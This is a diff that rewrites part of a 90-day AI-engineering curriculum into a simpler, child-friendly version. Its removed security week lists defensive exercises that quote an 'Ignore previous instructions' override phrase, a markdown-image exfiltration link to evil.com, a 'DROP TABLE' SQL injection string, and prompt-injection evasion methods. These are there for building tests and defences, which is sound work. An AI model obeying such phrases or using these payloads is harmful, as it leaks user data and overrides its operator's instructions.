-- [ ] **Build:** an assistant equipped with 4 local tools (search, calculator, file write, system clock) that executes functions and reports answers
-- [ ] **Done when:** The model emits valid JSON tool calls, your Python runtime executes the functions, and the model synthesizes the answer from tool output.
+### Day 50 — Let a program use one small, safe tool
+- [ ] Give your pretend helper one tool that can look up a made-up fact
+- [ ] Draw what information the tool receives and what answer it returns
+- [ ] Keep the tool read-only: it cannot send, delete, buy, or publish anything
+- [ ] **Build:** a tiny local lookup tool with one clearly described job
+- [ ] **Done when:** You can explain what the tool is allowed to do and what it must not do.
 
-### Day 51 — Tool resilience: exception feedback and self-correction
-- [ ] What happens when tools crash: why raising 500 errors destroys agent execution and how returning exceptions as observations enables self-repair
-- [ ] Guiding parameter correction: feeding invalid argument error traces back to the model so it corrects its own syntax on the next turn
-- [ ] Defensive execution: enforcing execution timeouts (5s) and catch-all exception wrappers around third-party tool code
-- [ ] **Build:** simulate a tool exception (e.g. invalid date string) and verify that the model analyzes the error and self-corrects on the next turn
-- [ ] **Done when:** A tool that raises a ValueError produces a polite self-repair from the model instead of an unhandled application crash.
+### Day 51 — Help your tool recover from a mistake
+- [ ] Give your tool an input it cannot understand and notice what happens
+- [ ] Show a kind message instead of a confusing error
+- [ ] Let the person try again once, then stop safely
+- [ ] **Build:** make the tool explain what kind of input it can use
+- [ ] **Done when:** Your tool gives a clear message when it receives something it cannot use.
 
-### Day 52 — The bounded agent loop: state, termination, and circuit breakers
-- [ ] The core agent loop: Plan -> Act -> Observe -> Evaluate -> Terminate
-- [ ] Loop circuit breakers: enforcing hard limits on maximum tool iterations (10 steps) and total execution time (30 seconds) to prevent infinite loops
-- [ ] Context compaction: summarizing or discarding intermediate tool observation history to prevent overflowing the context window
-- [ ] **Build:** a multi-step research agent that executes iterative tool actions and terminates reliably when its objective is met
-- [ ] **Done when:** Your agent successfully executes a 4-step research plan and is structurally incapable of looping beyond 10 steps.
+### Day 52 — Give a helper clear steps and a stopping point
+- [ ] Draw a short list of steps for a pretend helper to follow
+- [ ] Choose one clear point where it should stop
+- [ ] Try a made-up example and see whether the steps are easy to follow
+- [ ] **Build:** a helper plan that can read a pretend note and answer one question
+- [ ] **Done when:** Your helper follows a short plan and stops when it reaches the end.
 
-### Day 53 — The Model Context Protocol (MCP): universal tool switchboards ⭐
-- [ ] Understanding MCP: why Anthropic's open protocol solves the $M \times N$ custom integration problem for tools and resources
-- [ ] MCP protocol architecture: JSON-RPC 2.0 messages traveling over stdio or Server-Sent Events (SSE) transports
-- [ ] Exposing your Week 6 RAG pipeline as a standardized MCP tool (`search_knowledge_base`) and document resource
-- [ ] **Build:** a production MCP server using the official Python SDK that exposes your knowledge base to any compatible client
-- [ ] **Done when:** Your MCP server responds cleanly to standard `tools/list` and `tools/call` JSON-RPC protocol requests over stdio.
+### Day 53 — A shared plug shape for tools (optional idea) ⭐
+- [ ] Optional curiosity: imagine a shared plug that helps different programs connect to tools
+- [ ] Draw two programs and a tool with the shared plug between them
+- [ ] This is an idea to explore, not a setup you need to install
+- [ ] **Try:** explain why shared shapes can make connections easier
+- [ ] **Done when:** You can explain that a shared tool format helps different programs connect. You can skip this optional idea.
 
-### Day 54 — Connecting MCP: plugging into IDEs and desktop agents
-- [ ] Wiring your MCP server into desktop clients: configuring Claude Desktop, Cursor, or AI CLI agents via configuration manifests
-- [ ] Debugging MCP traffic: monitoring JSON-RPC handshakes, message logging, and handling unexpected transport disconnects
-- [ ] Security boundaries for MCP: restricting filesystem access and sanitizing tool arguments passed from desktop clients
-- [ ] **Build:** configure Claude Desktop or Cursor to query your custom MCP knowledge base directly during coding workflows
-- [ ] **Done when:** You can open Claude Desktop or Cursor and ask questions about your private documents via your live MCP server.
+### Day 54 — Connect a pretend helper to your project
+- [ ] Draw how a pretend helper might ask a program to use a safe tool
+- [ ] Label what the helper can ask and what it must not be allowed to do
+- [ ] No account or online connection is needed for this activity
+- [ ] **Try:** explain why the tool should only do its small allowed job
+- [ ] **Done when:** You can draw how a pretend helper might connect to your project; no account or online connection is needed.
 
-### Day 55 — Compound AI systems: deterministic state machines over free-floating agents ⭐
-- [ ] The senior rule: "If you can draw the flowchart, write code, not an autonomous agent"
-- [ ] The 4 Compound AI patterns: Router, Orchestrator-Workers, Evaluator-Optimizer, and Parallel Consensus
-- [ ] State machines with Pydantic AI or LangGraph: modeling state transitions as typed directed graphs with guard assertions
-- [ ] **Build:** a customer request workflow combining a deterministic Router with an Evaluator-Optimizer feedback loop
-- [ ] **Done when:** Every state transition in your workflow is deterministic, individually unit-tested, and mathematically incapable of infinite recursion.
+### Day 55 — Use a plan instead of letting a helper wander ⭐
+- [ ] Draw a flowchart for a helper with a few clear steps
+- [ ] Add a check that decides whether the answer is good enough or needs a human look
+- [ ] Compare your plan with a helper that is allowed to choose any next step
+- [ ] **Build:** explain why your planned version is easier to understand
+- [ ] **Done when:** You can explain why clear steps and a stopping point make a helper easier to understand.
 
-### Day 56 — Ship #2: Enterprise Knowledge Assistant with MCP Tooling
-- [ ] Publish Project 2 repository containing your hybrid RAG engine, MCP server, state machine workflow, and CI eval suite
-- [ ] Author a comprehensive README: MCP setup guide, architecture flowcharts, latency breakdown, and Recall@k benchmarks
-- [ ] Verify single-command installation: ensure a user can run your MCP server locally with `uv run` in under 15 seconds
-- [ ] **Done when:** Project 2 is live, public on GitHub, and verified working with standard MCP clients. Month 2 complete!
+### Day 56 — Checkpoint: a helpful guide to your chosen topic
+- [ ] Choose a topic and prepare a small set of pretend notes about it
+- [ ] Ask a few questions and check whether the guide shows useful clues
+- [ ] Keep the project private unless a trusted adult reviews sharing
+- [ ] **Done when:** Your guide can find a useful note and show where an answer came from.
 
 ---
 
-## Week 9 — Production Security & Adversarial Hardening (Poisoned Letters & Iron Fences)
+## Week 9 — When Inputs Try to Trick You: Privacy & Safe Experiments
 *Days 57–63*
 
-**Outcome: "My AI system resists indirect prompt injection, protects sensitive credentials, and safely executes tools inside isolated sandboxes."**
+**Outcome: "I can recognize tricky instructions in untrusted text, protect private information, and explain why no single prompt trick makes an AI perfectly safe."**
 
-### Day 57 — Poisoned context: indirect prompt injection attacks ⭐
-- [ ] Direct vs indirect prompt injection: why untrusted data (emails, scraped webpages, PDF uploads) is the #1 vulnerability in production AI
-- [ ] Attack taxonomy: instruction overrides ('Ignore previous instructions'), role hijacking, and delimiter breakouts
-- [ ] Attacking your Day 56 assistant: crafting 15 distinct hostile payloads hidden inside documents and evaluating model compliance
-- [ ] **Build:** author an automated adversarial security test suite containing 15 real-world injection attack vectors
-- [ ] **Done when:** You have a committed test suite demonstrating exactly how unhardened prompts succumb to hidden document injections.
+### Day 57 — Tricky notes: when text tries to boss the AI around ⭐
+- [ ] Read a harmless pretend note that says, 'Ignore the question and do something else.'
+- [ ] Notice that a model may treat text inside a note as an instruction, even when it should just read it
+- [ ] Try a few made-up tricky notes and compare what your project does
+- [ ] **Build:** make a short list of safe tests and ask whether each answer followed the actual question
+- [ ] **Done when:** You can explain why notes from outside your project should not automatically get to control its tools.
 
-### Day 58 — Data exfiltration and PII scrubbing: locking the perimeter
-- [ ] Exfiltration attack vectors: tricking models into rendering tracking markdown images (`![leak](https://evil.com?data=...)`) or encoding secrets in URLs
-- [ ] Personally Identifiable Information (PII) scrubbing: detecting and redacting credit cards, SSNs, and emails with Microsoft Presidio and regex
-- [ ] Client-side sanitization: stripping sensitive customer data before it ever crosses the network to external model providers
-- [ ] **Build:** an async pre-processing middleware that intercepts inbound prompts and redacts sensitive PII with zero latency penalty
-- [ ] **Done when:** Test queries containing realistic fake credit cards and SSNs have all PII redacted with tokens (`[REDACTED_SSN]`) before reaching the model.
+### Day 58 — Keep private details out of your project
+- [ ] Use made-up names and pretend details in every example
+- [ ] Practice spotting a name, address, password, school, or private photo that should not be shared
+- [ ] Ask a trusted adult before using online tools or sending any information anywhere
+- [ ] **Build:** replace private-looking details in a pretend paragraph with safe placeholders
+- [ ] **Done when:** You can spot several kinds of private information and replace them with pretend details.
 
-### Day 59 — Defense-in-depth: XML boundary fencing and dual-LLM guards
-- [ ] Structural isolation: wrapping untrusted user inputs and retrieved chunks in strict XML tags (`<untrusted_content>`) with system prompt warnings
-- [ ] Dual-LLM architecture: deploying a fast, cheap model as an isolated security guard checking untrusted inputs before passing them to the primary model
-- [ ] Output guardrails: scanning model completions to ensure internal system instructions or secret prompt templates are never reflected back
-- [ ] **Build:** implement XML boundary fencing and a dual-LLM guardrail filter that neutralizes the injection attacks created on Day 57
-- [ ] **Done when:** All 15 injection payloads from Day 57 are successfully neutralized by your boundary fence without degrading answer quality.
+### Day 59 — Labels can help organize text, but they are not magic shields
+- [ ] Try adding a label around made-up notes to show which words came from somewhere else
+- [ ] Compare what happens with and without the label
+- [ ] Remember: labels and instructions can help, but they cannot promise that a model will behave safely
+- [ ] **Build:** try labels around fake instructions and explain why they may help but cannot guarantee safety
+- [ ] **Done when:** You can show that labels may help organize text but cannot guarantee an AI will ignore every tricky instruction.
 
-### Day 60 — Tool sandboxing: defusing dangerous system calls
-- [ ] The danger of autonomous tool execution: SQL injections, arbitrary code execution, and unauthorized filesystem modifications
-- [ ] AST validation for database tools: parsing SQL with `sqlglot` to permit strictly read-only `SELECT` statements and reject `DROP`/`UPDATE`
-- [ ] Container and WASM sandboxing: executing untrusted Python or shell code inside isolated ephemeral Docker containers with no network access
-- [ ] **Build:** a hardened SQL query tool that inspects the syntax tree and aborts immediately on any write or schema-modifying operation
-- [ ] **Done when:** An attempted SQL injection (`SELECT *; DROP TABLE users;`) is intercepted and blocked at the AST parser level before touching the database.
+### Day 60 — Give tools only the tiny jobs they need
+- [ ] List exactly what your pretend tool can read or change
+- [ ] Make the tool read-only for this lesson: it can look up a made-up fact but cannot send, delete, buy, or publish anything
+- [ ] Try a tricky pretend request and check whether the tool stays within its small job
+- [ ] **Build:** a diagram showing the tool's one allowed job and the jobs it must refuse
+- [ ] **Done when:** You can explain why a tool should get only the smallest permissions it needs.
 
-### Day 61 — Human-in-the-loop: cryptographic approval gates for high-risk actions
-- [ ] Action risk classification: partitioning operations into Green (autonomous read-only) vs Red (destructive writes, wire transfers, email sends)
-- [ ] State suspension: freezing agent execution state and emitting an approval request ticket with an expiration TTL
-- [ ] Cryptographic approval tokens: resuming workflow execution only upon receipt of a signed HMAC approval token from a human operator
-- [ ] **Build:** implement a human approval interrupt for financial or data deletion actions with a simulated Slack/webhook callback
-- [ ] **Done when:** An agent attempting a destructive action halts execution, sends an approval ticket, and resumes only after receiving a valid authorization token.
+### Day 61 — Ask a trusted person before anything important happens
+- [ ] Sort pretend actions into safe-to-look-at and ask-first groups
+- [ ] Practice pausing before sharing, changing, deleting, buying, or sending anything
+- [ ] Write down who the trusted adult is for your project
+- [ ] **Build:** make a clear stop sign in your project for anything outside its small safe job
+- [ ] **Done when:** You can name actions that should stop and wait for an adult's help.
 
-### Day 62 — Red-teaming gauntlet: ruthless adversarial penetration testing
-- [ ] Conduct an uninterrupted 2-hour red-teaming drill attacking your own production systems from an adversarial perspective
-- [ ] Test complex evasion vectors: unicode character homoglyphs, multi-language prompt switching, base64 obfuscation, and persona roleplay
-- [ ] Document every successful penetration, map the root cause, and rate severity using CVSS criteria
-- [ ] **Build:** author a comprehensive Threat Model and Security Assessment document (`SECURITY.md`)
-- [ ] **Done when:** You have a documented vulnerability report cataloging tested attack vectors, root-cause mechanics, and prioritized engineering fixes.
+### Day 62 — Try harmless tricky examples and notice what goes wrong
+- [ ] Try three harmless, made-up notes that give confusing or conflicting instructions
+- [ ] See whether your helper follows your real question or gets distracted by the note
+- [ ] Write down what happened without including private information
+- [ ] **Build:** choose one small change that could make the project clearer or safer
+- [ ] **Done when:** You have three safe examples and can explain one limit of your project.
 
-### Day 63 — Ironclad defenses: automated security regression tests in CI
-- [ ] Implement engineering patches for the top two vulnerabilities uncovered during your Day 62 red-teaming gauntlet
-- [ ] Convert successful attack payloads into permanent automated pytest fixtures in your CI pipeline
-- [ ] Publish a formal Security Policy (`SECURITY.md`) detailing vulnerability reporting procedures and defensive guarantees
-- [ ] **Done when:** Your automated security test suite executes in CI on every push, ensuring patched prompt injection vulnerabilities can never regress.
+### Day 63 — Remember safety checks when you make changes
+- [ ] Choose one safety check from your earlier notes and try it again
+- [ ] Make one small improvement, then test the same examples
+- [ ] Remember that tests can find problems but cannot prove a project is perfectly safe
+- [ ] **Done when:** You can show one safety check you repeat after changing your project.
 
 ---
 
-## Week 10 — Observability, Tracing & Production Operations (Mission Control & The Flight Recorder)
+## Week 10 — Learning from Runs: Notes, Feedback & Troubleshooting
 *Days 64–70*
 
-**Outcome: "Every token, millisecond, and dollar is traced in real time, and user feedback continuously drives automated regression test cases."**
+**Outcome: "I can keep a simple record of what my project did, find a pattern in mistakes, and choose one useful improvement."**
 
-### Day 64 — Distributed tracing with Langfuse: the production flight recorder ⭐
-- [ ] Why logs are dead: the necessity of distributed trace waterfalls for multi-step AI pipelines (User -> RAG -> Rerank -> LLM -> Tool)
-- [ ] Setting up Langfuse (cloud or self-hosted Docker) and integrating the Python SDK
-- [ ] Instrumenting nested spans: capturing inputs, outputs, token counts, model names, and latency across every individual pipeline step
-- [ ] **Build:** instrument your Day 56 assistant with Langfuse so every user interaction generates an observable execution waterfall
-- [ ] **Done when:** You can open a web dashboard and view the full visual waterfall trace for any request, showing exact latency and cost per span.
+### Day 64 — Draw a map of what your program does ⭐
+- [ ] Draw each step from a question to your project's answer
+- [ ] Mark where the program reads notes, searches, or asks a model
+- [ ] Circle a step where something could go wrong and add a check
+- [ ] **Build:** a map another person can follow to understand your project
+- [ ] **Done when:** You can use your map to explain the main steps and one place you would check carefully.
 
-### Day 65 — Mission control dashboards: latency, cost, and throughput telemetry
-- [ ] Key production metrics: p50/p95/p99 latency percentiles, cost per user organization, token velocity, and error rates
-- [ ] Building monitoring widgets: tracking hourly token consumption by model version and isolating high-cost user queries
-- [ ] Setting up production tripwires: alerting on abnormal cost spikes ($10/hr threshold) or elevated p95 latency degradations (>3s)
-- [ ] **Build:** configure production monitoring dashboards with cost tracking, latency histograms, and alert thresholds
-- [ ] **Done when:** Your dashboard displays live telemetry graphs of request volume, p95 latency percentiles, and cumulative dollar spend.
+### Day 65 — Notice what works well and what feels slow or confusing
+- [ ] Try your project with a few pretend questions and note which answers are useful
+- [ ] Notice whether any part feels slow, confusing, or surprising
+- [ ] If using an online service, ask an adult to check its settings and any possible cost first
+- [ ] **Build:** a small table of what worked, what did not, and what you might change
+- [ ] **Done when:** You can point to one useful result and one thing you might improve.
 
-### Day 66 — Privacy-compliant telemetry: scrubbing secrets from trace storage
-- [ ] The dark side of tracing: accidentally leaking customer passwords, credit cards, or API tokens into third-party observability stores
-- [ ] Client-side trace sanitization: writing middleware to scrub authorization headers, session cookies, and regex PII before emitting spans
-- [ ] Compliance engineering: setting data retention policies and establishing audit logs for GDPR, HIPAA, and SOC2 compliance
-- [ ] **Build:** implement a trace masking filter that guarantees sensitive credentials and user PII never reach your observability database
-- [ ] **Done when:** Inspecting raw database traces confirms that zero authorization tokens or sensitive customer PII appear in telemetry storage.
+### Day 66 — Keep private information out of project notes
+- [ ] Only use pretend examples in project notes and experiment logs
+- [ ] Check that notes do not contain a real name, school, address, password, or private photo
+- [ ] Ask a trusted adult before storing or sharing any information online
+- [ ] **Build:** replace private-looking details in a pretend note with safe placeholders
+- [ ] **Done when:** Your project notes use made-up examples and contain no private information.
 
-### Day 67 — Forensic error analysis: clustering production failures
-- [ ] The senior approach to debugging: exporting 50 real production failure traces rather than guessing prompt fixes
-- [ ] Building a failure taxonomy: categorizing failures into Retrieval Miss (35%), Schema Invalidation (20%), User Ambiguity (30%), Hallucination (15%)
-- [ ] Error analysis methodology: letting empirical failure clusters prioritize engineering tasks instead of subjective intuition
-- [ ] **Build:** author a categorized failure taxonomy report ranking your system's production failures by frequency and impact
-- [ ] **Done when:** You have a ranked Pareto chart showing the exact percentage breakdown of why your system fails in production.
+### Day 67 — Look for patterns in pretend mistakes
+- [ ] Collect a few pretend examples where your project gave a surprising result
+- [ ] Group similar surprises together: missing note, confusing question, or answer not supported by a note
+- [ ] Choose the group that seems easiest or most useful to improve first
+- [ ] **Build:** draw a small chart showing the patterns you noticed
+- [ ] **Done when:** You can name one pattern in your examples and choose a small improvement to try.
 
-### Day 68 — User telemetry: capturing implicit signals and explicit feedback
-- [ ] Feedback modalities: implicit signals (copy-to-clipboard, dwell time, regeneration clicks) vs explicit signals (thumbs up/down, star ratings)
-- [ ] Binding feedback to trace IDs: attaching user ratings and textual comments directly to Langfuse execution traces via API
-- [ ] Building a defect review queue: filtering observability dashboards to inspect low-rated conversations for systemic flaws
-- [ ] **Build:** create a feedback endpoint that allows frontend users to submit thumbs up/down ratings linked directly to trace IDs
-- [ ] **Done when:** Submitting a thumbs-down in your UI immediately flags the corresponding execution trace in your Langfuse dashboard for review.
+### Day 68 — Use helpful feedback to improve your project
+- [ ] Ask someone you trust what they found clear or confusing when trying your project
+- [ ] Listen for a specific example rather than only 'good' or 'bad'
+- [ ] Decide which suggestion fits what you want your project to do
+- [ ] **Build:** write down one piece of feedback and what you chose to do with it
+- [ ] **Done when:** You have one useful suggestion and a reason for accepting or not accepting it.
 
-### Day 69 — Closing the loop: turning production defects into golden eval cases
-- [ ] Why static test sets decay: real users discover edge cases and ambiguities you never anticipated in development
-- [ ] The automated fly-wheel: harvesting production thumbs-down traces and promoting them into your golden evaluation dataset
-- [ ] Labeling ground truth: establishing canonical chunks and reference answers for newly discovered production failure modes
-- [ ] **Build:** export 10 failed production queries from Langfuse and convert them into permanent test fixtures in your golden eval suite
-- [ ] **Done when:** Your golden evaluation dataset expands with 10 real production failure cases, ensuring those exact defects can never recur.
+### Day 69 — Turn a surprising result into a new test
+- [ ] When an example surprises you, save a made-up version of it
+- [ ] Add it to your small test list so you can try it again after changing the project
+- [ ] Compare what happened before and after the change
+- [ ] **Build:** turn one surprise into a new test question
+- [ ] **Done when:** Your test list includes a question that once surprised you.
 
-### Day 70 — Production runbooks: SLAs, circuit cascades, and failover drills
-- [ ] Defining Service Level Objectives (SLOs): 99.5% service availability, p95 latency under 2.5s, and error rates below 0.5%
-- [ ] Automated provider cascades: orchestrating failover from primary provider (OpenAI) to secondary (Anthropic) to tertiary (local open model)
-- [ ] Authoring the Operations Runbook: documenting step-by-step triage procedures for rate limit storms, provider outages, and database locks
-- [ ] **Build:** conduct a live fire drill simulating a primary provider outage and verify automated failover to your secondary model
-- [ ] **Done when:** Simulating an upstream provider blackout triggers an automated failover within 500ms without dropping user connections.
+### Day 70 — Make a simple plan for when something goes wrong
+- [ ] Write down what to do if the project gets stuck or gives a confusing answer
+- [ ] Include a safe stop or reset step
+- [ ] Name the trusted adult who can help with setup or sharing questions
+- [ ] **Build:** add a short help note to your project
+- [ ] **Done when:** Someone you trust can find a safe way to stop or reset your project.
 
 ---
 
-## Week 11 — Open Source Models & LoRA Fine-Tuning (The Local Foundry & The Adapter Sleeve)
+## Week 11 — Optional Deep Dive: Models on Your Computer
 *Days 71–77*
 
-**Outcome: "I can serve open models on local metal with vLLM PagedAttention and use data to prove when LoRA fine-tuning beats prompt engineering."**
+**Outcome: "With adult help and suitable hardware, I can explore a model that runs locally and describe what shrinking a model changes."**
 
-### Day 71 — Local metal: running open weights with Ollama and llama.cpp
+### Day 71 — An optional peek at a model that runs on your computer
 - [ ] Why self-host: data sovereignty, zero external API latency, regulatory compliance, and offline operational guarantees
 - [ ] Running open models (Llama 3.1 8B, Qwen 2.5, Mistral 7B) locally on Apple Silicon or Linux GPUs using Ollama and llama.cpp
 - [ ] Interacting via OpenAI-compatible REST endpoints (`http://localhost:11434/v1`) using standard client libraries
 - [ ] **Build:** point your Week 4 extraction pipeline to a locally hosted open model and execute an extraction completely offline
-- [ ] **Done when:** Your entire structured extraction and search pipeline executes end-to-end with your machine completely disconnected from the internet.
+- [ ] **Done when:** With adult help, you tried a local model and can describe one thing it did differently. This challenge is optional.
 
-### Day 72 — High-throughput serving: PagedAttention and continuous batching with vLLM
+### Day 72 — Optional: how busy computers share their memory
 - [ ] The multi-user bottleneck: why naive HuggingFace pipelines choke and run out of GPU memory under concurrent traffic
 - [ ] PagedAttention mechanics: managing Key-Value (KV) cache memory like OS virtual memory pages to eliminate memory fragmentation
 - [ ] Continuous batching: dynamically pairing incoming and completing token sequences to maximize GPU tensor core utilization
 - [ ] **Build:** deploy an open model with vLLM and benchmark throughput under concurrent load against a standard inference baseline
-- [ ] **Done when:** You can draw a diagram explaining how PagedAttention allocates non-contiguous KV-cache memory blocks to serve 10x more users.
+- [ ] **Done when:** You can use a drawing to explain one way computers share limited memory. This challenge is optional.
 
-### Day 73 — Quantization economics: FP16, INT8, 4-bit, and VRAM arithmetic
+### Day 73 — Optional: how computers make models smaller
 - [ ] Quantization math: compressing 16-bit floating-point weights into 4-bit integer representations (AWQ, GPTQ, GGUF)
 - [ ] The physical memory equation: calculating exact GPU VRAM requirements: $\text{VRAM} = (\text{parameters} \times \text{bytes\_per\_weight}) + \text{KV\_cache}$
 - [ ] Measuring perplexity degradation: evaluating reasoning loss across 4-bit vs 8-bit vs 16-bit weight representations
 - [ ] **Build:** run benchmark inference comparing memory usage, tokens per second, and perplexity across 4-bit and 8-bit quantized weights
-- [ ] **Done when:** You can calculate on a whiteboard the exact GPU VRAM in gigabytes required to host any model at a 32k context length.
+- [ ] **Done when:** You can describe one trade-off when making a model smaller. This challenge is optional.
 
-### Day 74 — The fine-tuning balance sheet: when to tune vs when to prompt ⭐
+### Day 74 — Optional: teach a model with examples or clearer instructions? ⭐
 - [ ] When fine-tuning is the winning move: enforcing rigid bespoke schemas, dropping latency by eliminating long prompts, or distilling large models
 - [ ] When fine-tuning is an expensive trap: trying to inject dynamic factual knowledge (which is what RAG does) or working with <500 examples
 - [ ] The total cost of ownership: data curation overhead, training compute costs, and perpetual model maintenance vs prompt iteration speed
 - [ ] **Build:** author a technical decision matrix analyzing an enterprise use case and defend why fine-tuning is or is not justified
-- [ ] **Done when:** You can defend your decision with quantitative data: explaining why 'Prompting + RAG' is usually the senior choice.
+- [ ] **Done when:** You can explain one difference between changing instructions and changing a model with examples. This challenge is optional.
 
-### Day 75 — Synthetic data distillation: generating training pairs with frontier models
+### Day 75 — Optional: make practice examples and check them carefully
 - [ ] Teacher-student distillation: prompting a frontier model (Claude 3.5 Sonnet / GPT-4o) to generate diverse, high-quality instruction-response pairs
 - [ ] Data quality filtering: applying LLM-as-a-judge heuristics, schema checks, and deduplication to purge low-quality or corrupt training rows
 - [ ] Formatting datasets: converting raw data into standardized ChatML format stored as clean JSONL files
 - [ ] **Build:** generate, filter, and validate a 300-example high-signal synthetic training dataset for a specialized extraction task
-- [ ] **Done when:** Your synthetic training dataset passes strict JSONL validation, contains zero duplicate samples, and achieves 100% schema compliance.
+- [ ] **Done when:** You can describe why practice examples should be checked carefully. This challenge is optional.
 
-### Day 76 — LoRA mechanics: training low-rank adapter sleeves
+### Day 76 — Optional: a small add-on that changes a model's style
 - [ ] Low-Rank Adaptation (LoRA) mechanics: freezing multi-billion parameter base weights and training tiny rank decomposition matrices ($W = W_0 + B \cdot A$)
 - [ ] Hyperparameter tuning: selecting Rank ($r=8, 16, 32$), Alpha scaling ($\alpha = 2r$), target projection modules, and learning rate schedules
 - [ ] Executing a LoRA fine-tuning run on a hosted GPU instance (Unsloth, Modal, or RunPod) in under 30 minutes for less than $2.00
 - [ ] **Build:** fine-tune an open 8B model (Llama 3.1 8B or Qwen 2.5 7B) on your custom dataset and export the trained LoRA adapter weights
-- [ ] **Done when:** Your training loss curves converge smoothly without overfitting and output a validated LoRA adapter checkpoint file.
+- [ ] **Done when:** You can explain one way a small add-on might influence a model. This challenge is optional.
 
-### Day 77 — The showdown: fine-tuned adapter vs prompt-engineered baseline
-- [ ] Run a head-to-head shootout: evaluate your fine-tuned 8B model against the prompt-engineered base model on an unseen evaluation test set
-- [ ] Compare key production metrics: schema compliance rate, p95 latency, input token overhead, and dollar cost per 1,000 queries
-- [ ] Calculate the financial break-even point: at what daily query volume does fine-tuning pay back its initial dataset and training costs?
-- [ ] **Build:** author a comparative evaluation report with side-by-side completion diffs, latency graphs, and cost comparisons
-- [ ] **Done when:** You have a data-backed report proving whether your fine-tuned adapter outperformed the prompt-engineered baseline on accuracy, latency, and cost.
+### Day 77 — Optional: compare two ways to change an answer
+- [ ] Optional: choose a model idea that interests you and ask a trusted adult to help explore it
+- [ ] Compare two made-up answers and decide which one better follows the same instruction
+- [ ] Write down one thing that stayed the same and one thing that changed
+- [ ] **Try:** draw or describe how training examples might influence a model's patterns
+- [ ] **Done when:** You can explain one difference you noticed and one question you still have.
 
 ---
 
-## Week 12 — Capstone Platform, Playbook & Career Positioning (The Fortress & The Flight Log)
+## Week 12 — Your Big Project: Make It Work, Explain It & Share Safely
 *Days 78–84*
 
-**Outcome: "I have shipped an end-to-end production AI platform, authored an emergency outage playbook, and can answer senior system design questions cold."**
+**Outcome: "I have improved a project I chose, tested it with examples, and can show or explain it safely to people I trust."**
 
-### Day 78 — Capstone architecture: blueprints for a production AI platform
-- [ ] Architectural scoping: design a production AI platform solving a real problem that you will continue using every single week
-- [ ] Full-stack synthesis: combine Ingestion + Hybrid Search (BM25 + Dense) + Cross-Encoder + MCP + State Machine + Langfuse Tracing
-- [ ] Define enterprise boundaries: tenant data isolation, authentication, rate limiting quotas, and fallback cascades
-- [ ] **Build:** author the comprehensive System Architecture Document and detailed component dataflow diagram for your capstone
-- [ ] **Done when:** Your architecture document specifies every component interface, data schema, latency budget, and security fence.
+### Day 78 — Plan a small project around a question you care about
+- [ ] Choose a small job for your project, such as finding a fact in a story-world guide
+- [ ] Draw the steps from a question to a helpful answer
+- [ ] Choose fictional or public information for it to use
+- [ ] **Build:** sketch a simple plan and ask an adult to check any setup that uses accounts or downloads
+- [ ] **Done when:** You can explain what your project is for and show its main steps in a drawing.
 
-### Day 79 — Platform assembly: end-to-end system integration
-- [ ] Wire the user interface (Streamlit, Next.js, or CLI) to your battle-hardened async FastAPI backend
-- [ ] Connect real-time SSE token streaming with live, interactive inline citation linking to retrieved document chunks
-- [ ] Hook up distributed tracing via Langfuse to capture end-to-end request spans from UI click to completion
-- [ ] **Build:** execute complete integration tests proving that user queries flow through search, reranking, generation, and tracing cleanly
-- [ ] **Done when:** A user can submit a complex query in the UI, watch tokens stream with live source citations, and see the full trace recorded in Langfuse.
+### Day 79 — Connect the pieces you understand
+- [ ] Connect the parts you understand: question, notes, search, and answer
+- [ ] Show which note might support the answer
+- [ ] Keep it on your own computer with pretend examples
+- [ ] **Build:** try one question from beginning to end and write down what happened
+- [ ] **Done when:** Your project can try one useful question and show a note that may help answer it.
 
-### Day 80 — Stress-testing under fire: load generation and bottleneck profiling
-- [ ] Simulate high-concurrency production load: run Locust or k6 to pound your endpoints with 20+ concurrent synthetic users
-- [ ] Profile system bottlenecks under pressure: vector database connection saturation, async event loop stalls, and memory consumption
-- [ ] Optimize performance: tune HTTP connection pools, cache frequently requested queries, and adjust concurrency semaphores
-- [ ] **Build:** execute a sustained 15-minute load test and record p50, p95, and p99 latency percentiles and error rates under load
-- [ ] **Done when:** Your platform maintains a 99%+ success rate with p95 latency under 2.5 seconds during sustained multi-user load testing.
+### Day 80 — Try new examples and look for surprises
+- [ ] Try your project with three different pretend questions
+- [ ] Include one question you expect it to find difficult
+- [ ] Notice where it takes longer or gives a less useful answer
+- [ ] **Try:** change one small thing and compare again
+- [ ] **Done when:** You can name one example that worked well and one that needs improvement.
 
-### Day 81 — The emergency manual: authoring the Production Failure Playbook ⭐
-- [ ] Document real failure scenarios: primary provider blackouts, 429 rate limit throttling storms, vector index corruption, and injection breaches
-- [ ] Author step-by-step incident response runbooks: exact detection queries, root-cause diagnosis commands, and emergency remediation steps
-- [ ] Document fallback procedures: manual provider failover switches, index rebuild commands, and degraded read-only operational modes
-- [ ] **Build:** author the complete Production Failure Playbook in `PLAYBOOK.md` detailing 5 real-world outage scenarios
-- [ ] **Done when:** A junior engineer on call at 2 AM reading your playbook knows the exact commands to run to diagnose and resolve an outage.
+### Day 81 — Write a friendly guide to your project ⭐
+- [ ] List two things someone might find confusing when trying your project
+- [ ] Write simple steps for trying it with pretend examples
+- [ ] Add a note about what the project cannot do yet
+- [ ] **Build:** make a one-page friendly guide with a picture or diagram
+- [ ] **Done when:** You have a short note that tells someone you trust how to try your project and what to do if it gets stuck.
 
-### Day 82 — Shipping the technical narrative: the deep-dive architectural write-up ⭐
-- [ ] Why technical write-ups get you hired: engineering leaders look for trade-off reasoning, economic awareness, and honesty about what broke
-- [ ] Structure the write-up: The Problem -> Architecture -> Engineering Trade-offs -> Empirical Evaluation Scorecard -> What Failed & Lessons
-- [ ] Lead with real numbers: cite exact dollars per query, p95 millisecond waterfalls, Recall@5 metrics, and load test throughput
-- [ ] **Build:** publish your comprehensive technical deep-dive write-up on your technical blog or as a GitHub repository showcase
-- [ ] **Done when:** A stranger reading your write-up immediately understands your architectural decisions, cost economics, and engineering maturity.
+### Day 82 — Tell the story of your project ⭐
+- [ ] Tell the story: what you wondered, what you made, and what happened
+- [ ] Add one example that worked and one that surprised you
+- [ ] Explain one limitation and one thing you would like to improve
+- [ ] **Build:** write a short project story, draw it, or explain it to someone you trust
+- [ ] **Done when:** Someone you trust can understand what your project does and what you learned from making it.
 
-### Day 83 — The senior technical gauntlet: drilling the 25 core questions
-- [ ] Review the 25 Senior AI Engineering Questions in Section 4 of the 90-day plan
-- [ ] Practice answering every question out loud without checking notes, using physical mechanisms, exact numbers, and trade-off comparisons
-- [ ] Conduct an adversarial mock technical interview: defend your Capstone architecture, design choices, and failure playbooks under pressure
